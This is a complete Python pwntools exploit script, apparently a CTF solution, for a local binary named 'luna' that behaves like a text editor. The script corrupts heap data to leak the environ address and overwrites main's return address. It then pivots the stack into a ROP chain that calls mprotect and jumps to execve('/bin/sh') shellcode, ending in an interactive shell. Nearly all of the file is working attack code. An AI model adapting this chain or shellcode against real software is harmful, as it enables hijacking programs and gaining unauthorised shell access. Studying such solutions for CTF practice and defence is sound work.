#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './luna'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/4gx 0x6D9340
        echo array:\\n
        x/16x *(void **)0x6D9340
        end
    b *0x4011a2
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def new_tab():
    sh.sendlineafter('>>> ', 'n')

def insert_tab(text):
    sh.sendlineafter('>>> ', 'i')
    sh.sendline(str(0))
    sh.sendline(text)

def cut(num):
    sh.sendlineafter('>>> ', 'c')
    sh.sendline(str(0) + ' ' + str(num))

def paste():
    sh.sendlineafter('>>> ', 'p')
    sh.sendline(str(0))

def write(content):
    for i in range(len(content)):
        sh.sendlineafter('>>> ', 'r')
        sh.sendline(str(i) + ' ' + str(i + 1))
        sh.sendline(content[i])

def select(index):
    sh.sendlineafter('>>> ', 's')
    sh.sendline(str(index))

def display(start, end):
    sh.sendlineafter('>>> ', 'd')
    sh.sendline(str(start) + ' ' + str(end))

    
insert_tab('a' * 0x18)
cut(0x18)

new_tab()
insert_tab('b' * 0xf8)
cut(0xf0)

new_tab()
paste()

write(p64(0x21) * 8 + p64(8) + p64(0) + p64(elf.symbols['environ']))
select(1)
display(0, 8)

environ_addr = u64(sh.recvn(8))
log.success('environ_addr: ' + hex(environ_addr))

select(2)
write(p64(0x21) * 8 + p64(0x100) + p64(0) + p64(environ_addr - 0x130 - 8)) # main return

select(1)
 # main return
write(p64(0x6d9360) + p64(0x0000000000400bcb)) # leave; ret

layout = [
    0,
    0x00000000004006a6, #: pop rdi; ret;
    0x6d9000,
    0x0000000000411583, #: pop rsi; ret; 
    0x2000,
    0x000000000044d836, #: pop rdx; ret; 
    7,
    elf.symbols['mprotect'],
    0x00000000004ae2a7, #: jmp rsp; 
]

shellcode = asm('''
mov rax, 0x0068732f6e69622f
push rax

mov rdi, rsp
xor rsi, rsi
mul rsi
mov al, 59
syscall
''')

new_tab()
insert_tab(flat(layout) + shellcode)

sh.sendlineafter('>>> ', 'q')

sh.interactive()
clear()